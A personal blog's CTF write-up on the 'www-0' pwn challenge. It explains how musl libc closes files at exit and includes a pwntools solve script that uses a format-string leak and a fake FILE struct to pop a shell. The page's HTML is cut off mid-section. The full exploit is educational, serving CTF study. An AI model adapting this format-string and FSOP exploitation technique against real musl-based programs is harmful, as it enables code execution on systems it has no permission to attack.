<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>File Stream Oriented Programming (FSOP) on Musl Libc | Nouxia's Notes</title><meta name=keywords content="fsop,musl,pwn"><meta name=description content="A couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named www-0. The main twist of the challenge was that it&rsquo;s run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we&rsquo;ll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures."><meta name=author content><link rel=canonical href=http://localhost:1313/posts/musl-fsop-arkavidia-2025/><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/musl-fsop-arkavidia-2025/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/musl-fsop-arkavidia-2025/"><meta property="og:site_name" content="Nouxia's Notes"><meta property="og:title" content="File Stream Oriented Programming (FSOP) on Musl Libc"><meta property="og:description" content="A couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named www-0. The main twist of the challenge was that it’s run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we’ll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-07-03T21:58:08+07:00"><meta property="article:modified_time" content="2025-07-03T21:58:08+07:00"><meta property="article:tag" content="Fsop"><meta property="article:tag" content="Musl"><meta property="article:tag" content="Pwn"><meta name=twitter:card content="summary"><meta name=twitter:title content="File Stream Oriented Programming (FSOP) on Musl Libc"><meta name=twitter:description content="A couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named www-0. The main twist of the challenge was that it&rsquo;s run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we&rsquo;ll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"File Stream Oriented Programming (FSOP) on Musl Libc","item":"http://localhost:1313/posts/musl-fsop-arkavidia-2025/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"File Stream Oriented Programming (FSOP) on Musl Libc","name":"File Stream Oriented Programming (FSOP) on Musl Libc","description":"A couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named www-0. The main twist of the challenge was that it\u0026rsquo;s run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we\u0026rsquo;ll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures.\n","keywords":["fsop","musl","pwn"],"articleBody":"A couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named www-0. The main twist of the challenge was that it’s run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we’ll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures.\nChallenge Overview Download Challenge Files\nYou can follow along and try the challenge for yourself if you want to by clicking the download link above. The challenge files include the binary, its source code, and the corresponding Docker files to spin up your own instance. The source code is as follows.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include #include void gift() { char buf[1024] = {0}; scanf(\" %32[^$n\\n]\", buf); printf(buf); putchar('\\n'); } int main() { gift(); long long *ptr; printf(\"Where: \"); fflush(stdout); scanf(\"%p\", \u0026ptr); printf(\"What: \"); fflush(stdout); scanf(\"%lli\", ptr); exit(0); } [*] '/home/nouxia/ctf/arkavidia/pwn/www-0/chall' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes As a summary, the program will:\nAsk the user for some input, which is then immediately passed into a printf call, resulting in a format string vulnerability. Ask the user for an arbitrary address. Ask the user for an 8-byte integer, which will be written to the aforementioned address. The challenge is quite simple and the vulnerability is very obvious, but it’ll be somewhat tricky to exploit.\nLeaking Libc The challenge imposes a constraint on the string you’re allowed to input. The string must be at most 32 characters long and mustn’t contain $ or n. This poses some difficulty as you usually use$ to specify the offset when trying to leak values off the stack. To get around this, we can use multiple format specifiers to simulate leaking an offset. For example, to leak %5$p, we can send in %p%p%p%p%p and the 5th %p will correspond to the value on the stack at offset 5.\nWith that out of the way, first things first we need to find the offset of our input buffer, as standard for most format string vulnerabilities.\n$ ./chall_patched AAAAAAAA%p%p%p%p%p%p AAAAAAAA00x140x5d0x7ffd12e35bb000x4141414141414141 Where: We find that our buffer sits at offset 6. With this in mind, we can craft the final format string. As mentioned before, we’ll send in a GOT entry along with a %s format at the right offset to leak a libc address.\n1 2 3 4 5 6 7 payload = flat( b'%p%p%p%p%p%p%p%p|%s'.ljust(24, b'.'), exe.got['putchar'], ) io.sendline(payload) io.recvuntil(b'|') libc_leak = u64(io.recv(6).ljust(8, b'\\0')) [+] Starting local process '/home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched': pid 186020 [+] hex(libc_leak) = '0x70383b2f8418' [*] Switching to interactive mode .....\\xa0?@ Where: $ pwndbg\u003e vmmap 0x7914c2902418 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File 0x7914c28a0000 0x7914c28b4000 r--p 14000 0 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 ► 0x7914c28b4000 0x7914c290b000 r-xp 57000 14000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 +0x4e418 0x7914c290b000 0x7914c2941000 r--p 36000 6b000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 pwndbg\u003e distance 0x7914c2902418 0x7914c28a0000 0x7914c2902418-\u003e0x7914c28a0000 is -0x62418 bytes (-0xc483 words) pwndbg\u003e Awesome, we now have obtained the libc base address. Moving on, let’s explore what we can do with an 8-byte overwrite. Notice how after the program writes our 8 bytes, it immediately calls exit(0). So let’s start there. Let’s explore what actually happens when a program calls exit.\nWhat Happens when exit() is Called? To answer this question, let’s take a look at the musl source code. To provide context for the next section, our final plan will revolve around crafting a fake FILE struct, such that system(\"/bin/sh\") will be called when that file is closed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // File: src/exit/exit.c #include #include #include \"libc.h\" #include \"pthread_impl.h\" #include \"atomic.h\" #include \"syscall.h\" ... _Noreturn void exit(int code) { /* Handle potentially concurrent or recursive calls to exit, * whose behaviors have traditionally been undefined by the * standards. Using a custom lock here avoids pulling in lock * machinery and lets us trap recursive calls while supporting * multiple threads contending to be the one to exit(). */ static volatile int exit_lock[1]; int tid = __pthread_self()-\u003etid; int prev = a_cas(exit_lock, 0, tid); if (prev == tid) a_crash(); else if (prev) for (;;) __sys_pause(); __funcs_on_exit(); __libc_exit_fini(); __stdio_exit(); _Exit(code); } There are 3 functions that can be of our interest here, __funcs_on_exit, __libc_exit_fini, and __stdio_exit. However, so this post doesn’t become too long, I’ll only be talking about __stdio_exit, which is be the function we’ll be taking advantage of for our exploit. But as a general overview, __funcs_on_exit is where the functions registered by atexit will be called, and __libc_exit_fini is equivalent to _dl_fini on glibc. Below is the source code for __stdio_exit and __ofl_lock, one of the functions called within it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // File: src/stdio/ofl.c #include \"stdio_impl.h\" #include \"lock.h\" #include \"fork_impl.h\" static FILE *ofl_head; static volatile int ofl_lock[1]; volatile int *const __stdio_ofl_lockptr = ofl_lock; FILE **__ofl_lock() { LOCK(ofl_lock); return \u0026ofl_head; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // File: src/stdio/__stdio_exit.c #include \"stdio_impl.h\" static FILE *volatile dummy_file = 0; weak_alias(dummy_file, __stdin_used); weak_alias(dummy_file, __stdout_used); weak_alias(dummy_file, __stderr_used); static void close_file(FILE *f) { if (!f) return; FFINALLOCK(f); if (f-\u003ewpos != f-\u003ewbase) f-\u003ewrite(f, 0, 0); if (f-\u003erpos != f-\u003erend) f-\u003eseek(f, f-\u003erpos-f-\u003erend, SEEK_CUR); } void __stdio_exit(void) { FILE *f; for (f=*__ofl_lock(); f; f=f-\u003enext) close_file(f); close_file(__stdin_used); close_file(__stdout_used); close_file(__stderr_used); } The function __stdio_exit is responsible for closing all open FILE handles. Furthermore, __ofl_lock will return the head of the linked list containing all open FILE handles, similar to _IO_list_all in glibc. After that, each FILE in the list will be closed one by one followed by stdin, stdout, and stderr.\nThe key thing to observe here is the calls to f-\u003ewrite and f-\u003eseek in close_file. The write and seek members of the FILE struct are overwritable pointers. So, if we can insert a pointer to system into either write or seek, we will successfully call system when that FILE is closed. However, we need to ensure that f-\u003ewpos != f-\u003ewbase or f-\u003erpos != f-\u003erend so that the function will be called. To find out the needed offsets in the FILE struct, let’s take a look at the disassembly of close_file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pwndbg\u003e x/30i 0x7ffff7fb829a 0x7ffff7fb829a: test rdi,rdi 0x7ffff7fb829d: je 0x7ffff7fb82e9 0x7ffff7fb829f: push rbx 0x7ffff7fb82a0: mov eax,DWORD PTR [rdi+0x8c] 0x7ffff7fb82a6: mov rbx,rdi 0x7ffff7fb82a9: test eax,eax 0x7ffff7fb82ab: jns 0x7ffff7fb82e0 0x7ffff7fb82ad: mov rax,QWORD PTR [rbx+0x38] 0x7ffff7fb82b1: cmp QWORD PTR [rbx+0x28],rax // if (f-\u003ewpos != f-\u003ewbase) 0x7ffff7fb82b5: je 0x7ffff7fb82c1 0x7ffff7fb82b7: xor edx,edx 0x7ffff7fb82b9: xor esi,esi 0x7ffff7fb82bb: mov rdi,rbx 0x7ffff7fb82be: call QWORD PTR [rbx+0x48] // f-\u003ewrite(f, 0, 0); We find that wpos is located at FILE+0x28, wbase at FILE+0x38, and write at FILE+0x48. Alrighty, so to call system(\"/bin/sh\"), our fake FILE must have:\nFILE+0x0 equal to \"/bin/sh\" in its integer representation. We need this because the first argument to f-\u003ewrite is our FILE itself. wpos != wbase or FILE+0x28 != FILE+0x38 write or FILE+0x48 equal to system After making our fake FILE, the last thing we need to do is to overwrite ofl_head such that it points to it. Note that here I choose to overwrite f-\u003ewrite, but the same principles apply should you choose to overwrite f-\u003eseek.\nHow do We Write Our Fake FILE? But wait, the FILE struct is huge, and we can only write 8 bytes at a time. So, what’s the solution? Fortunately, stdin in this challenge is buffered. When a file stream is buffered, any input intended for it is explicitly stored in a memory buffer. We can see this for ourselves in the following example.\npwndbg\u003e disass gift Dump of assembler code for function gift: ... 0x000000000040125d \u003c+45\u003e: lea rdi,[rip+0xd9c] # 0x402000 =\u003e 0x0000000000401264 \u003c+52\u003e: call 0x401060 0x0000000000401269 \u003c+57\u003e: mov rdi,rsp ... End of assembler dump. pwndbg\u003e b *(gift+57) Breakpoint 3 at 0x401269 pwndbg\u003e r Starting program: /home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched AAAAAAAA Here, I set a breakpoint right after a scanf call, then I sent in 8 \"A\"s\npwndbg\u003e search AAAAAAAA Searching for byte: b'AAAAAAAA' [anon_7ffff7ffc] 0x7ffff7ffc2e8 'AAAAAAAA\\n' [stack] 0x7fffffffd270 'AAAAAAAA' pwndbg\u003e vmmap 0x7ffff7ffc2e8 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File 0x7ffff7ffb000 0x7ffff7ffc000 rw-p 1000 a1000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 ► 0x7ffff7ffc000 0x7ffff7fff000 rw-p 3000 0 [anon_7ffff7ffc] +0x2e8 pwndbg\u003e x/gx \u0026stdin 0x7ffff7ffad60 : 0x00007ffff7ffb180 pwndbg\u003e x/20gx 0x00007ffff7ffb180 0x7ffff7ffb180: 0x0000000000000009 0x00007ffff7ffc2f0 0x7ffff7ffb190: 0x00007ffff7ffc2f1 0x00007ffff7fb8277 0x7ffff7ffb1a0: 0x0000000000000000 0x0000000000000000 0x7ffff7ffb1b0: 0x0000000000000000 0x0000000000000000 0x7ffff7ffb1c0: 0x00007ffff7fb832b 0x0000000000000000 0x7ffff7ffb1d0: 0x00007ffff7fb83f6 0x00007ffff7ffc2e8 \u003c-- This is where our \"AAAAAAAA\" is stored. As a matter of fact, this address is the buffer used for stdin 0x7ffff7ffb1e0: 0x0000000000000400 0x0000000000000000 0x7ffff7ffb1f0: 0x0000000000000000 0x0000000000000000 0x7ffff7ffb200: 0x0000000000000000 0xffffffffffffffff 0x7ffff7ffb210: 0x0000000000000000 0x0000000000000000 pwndbg\u003e After that, I searched the memory space for those 8 \"A\"s and found that it’s stored in 2 places. One in the stack and the other in some place near libc. After further investigation, it can be found that this “some place” is actually the buffer used for stdin. If stdin were unbuffered in this challenge, those 8 \"A\"s would be discarded after it’s been processed and wouldn’t be stored in memory.\nSo, knowing this, we can insert our fake FILE right after our normal input to scanf. Then, we overwrite ofl_head to point to the stdin buffer. With this setup, system(\"/bin/sh\") will be called when __stdio_exit is executed.\nSolve Script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 #!/usr/bin/env python3 # -*- coding: utf-8 -*- from pwn import * context.terminal = 'wt.exe wsl -d Ubuntu'.split() exe = context.binary = ELF(args.EXE or './chall_patched') host = args.HOST or 'localhost' port = int(args.PORT or 8002) if args.LOCAL_LIBC: libc = exe.libc elif args.LOCAL: library_path = libcdb.download_libraries('ld-musl-x86_64.so.1') if library_path: exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path) libc = exe.libc else: libc = ELF('ld-musl-x86_64.so.1') else: libc = ELF('ld-musl-x86_64.so.1') def start_local(argv=[], *a, **kw): '''Execute the target binary locally''' if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) def start_remote(argv=[], *a, **kw): '''Connect to the process on the remote host''' io = connect(host, port) if args.GDB: gdb.attach(io, gdbscript=gdbscript) return io def start(argv=[], *a, **kw): '''Start the exploit against the target.''' if args.LOCAL: return start_local(argv, *a, **kw) else: return start_remote(argv, *a, **kw) gdbscript = ''' b *(main+118) continue '''.format(**locals()) # -- Exploit goes here -- io = start() # Leak musl address payload = flat( b'%p%p%p%p%p%p%p%p|%s'.ljust(24, b'.'), exe.got['putchar'], ) io.sendline(payload) io.recvuntil(b'|') libc_leak = u64(io.recv(6).ljust(8, b'\\0')) libc_address = libc_leak - 0x62418 system = libc_address + 0x5bb7e ofl_head = libc_address + 0xa4e88 scanf_buf = libc_address + 0xa32e8 log.success(f'{hex(libc_leak) = }') log.success(f'{hex(libc_address) = }') log.success(f'{hex(ofl_head) = }') log.success(f'{hex(scanf_buf) = }') # Create a fake file and overwrite ofl_head to point to it io.sendlineafter(b'Where: ', hex(ofl_head).encode()) io.sendlineafter(b'What: ', flat( (str(scanf_buf + 0x10).encode() + b'\\n').ljust(16, b'\\0'), int.from_bytes(b'/bin/sh\\0', 'little'), 4 * p64(0x0), 0x0, # wpos 0x0, 0x1, # wbase 0x0, # read system, # write )) io.interactive() $ ./solve.py [*] '/home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes [*] '/home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to localhost on port 8002: Done [+] hex(libc_leak) = '0x7add684b6418' [+] hex(libc_address) = '0x7add68454000' [+] hex(ofl_head) = '0x7add684f8e88' [+] hex(scanf_buf) = '0x7add684f72e8' [*] Switching to interactive mode $ ls chall flag.txt $ cat flag.txt flag{test} $ References musl source code - https://github.com/kraj/musl ","wordCount":"2085","inLanguage":"en","datePublished":"2025-07-03T21:58:08+07:00","dateModified":"2025-07-03T21:58:08+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/musl-fsop-arkavidia-2025/"},"publisher":{"@type":"Organization","name":"Nouxia's Notes","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Nouxia's Notes (Alt + H)">Nouxia's Notes</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/archives/ title=Archives><span>Archives</span></a></li><li><a href=http://localhost:1313/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">File Stream Oriented Programming (FSOP) on Musl Libc</h1><div class=post-meta><span title='2025-07-03 21:58:08 +0700 WIB'>July 3, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;2085 words</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#leaking-libc>Leaking Libc</a></li><li><a href=#what-happens-when-exit-is-called>What Happens when <code>exit()</code> is Called?</a></li><li><a href=#how-do-we-write-our-fake-file>How do We Write Our Fake <code>FILE</code>?</a></li><li><a href=#solve-script>Solve Script</a></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><p>A couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named <code>www-0</code>. The main twist of the challenge was that it&rsquo;s run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we&rsquo;ll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures.</p><h2 id=challenge-overview>Challenge Overview<a hidden class=anchor aria-hidden=true href=#challenge-overview>#</a></h2><p><a href=www-0.zip>Download Challenge Files</a></p><p>You can follow along and try the challenge for yourself if you want to by clicking the download link above. The challenge files include the binary, its source code, and the corresponding Docker files to spin up your own instance. The source code is as follows.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>gift</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>1024</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34; %32[^$n</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>]&#34;</span>, buf);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(buf);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>putchar</span>(<span style=color:#e6db74>&#39;\n&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>gift</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>ptr;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Where: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fflush</span>(stdout);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%p&#34;</span>, <span style=color:#f92672>&amp;</span>ptr);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;What: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fflush</span>(stdout);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%lli&#34;</span>, ptr);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/nouxia/ctf/arkavidia/pwn/www-0/chall&#39;</span>
</span></span><span style=display:flex><span>    Arch:       amd64-64-little
</span></span><span style=display:flex><span>    RELRO:      Full RELRO
</span></span><span style=display:flex><span>    Stack:      Canary found
</span></span><span style=display:flex><span>    NX:         NX enabled
</span></span><span style=display:flex><span>    PIE:        No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Stripped:   No
</span></span><span style=display:flex><span>    Debuginfo:  Yes
</span></span></code></pre></div><p>As a summary, the program will:</p><ol><li>Ask the user for some input, which is then immediately passed into a <code>printf</code> call, resulting in a format string vulnerability.</li><li>Ask the user for an arbitrary address.</li><li>Ask the user for an 8-byte integer, which will be written to the aforementioned address.</li></ol><p>The challenge is quite simple and the vulnerability is very obvious, but it&rsquo;ll be somewhat tricky to exploit.</p><h2 id=leaking-libc>Leaking Libc<a hidden class=anchor aria-hidden=true href=#leaking-libc>#</a></h2><p>The challenge imposes a constraint on the string you&rsquo;re allowed to input. The string must be at most 32 characters long and mustn&rsquo;t contain <code>$</code> or <code>n</code>. This poses some difficulty as you usually use<code>$</code> to specify the offset when trying to leak values off the stack. To get around this, we can use multiple format specifiers to simulate leaking an offset. For example, to leak <code>%5$p</code>, we can send in <code>%p%p%p%p%p</code> and the 5th <code>%p</code> will 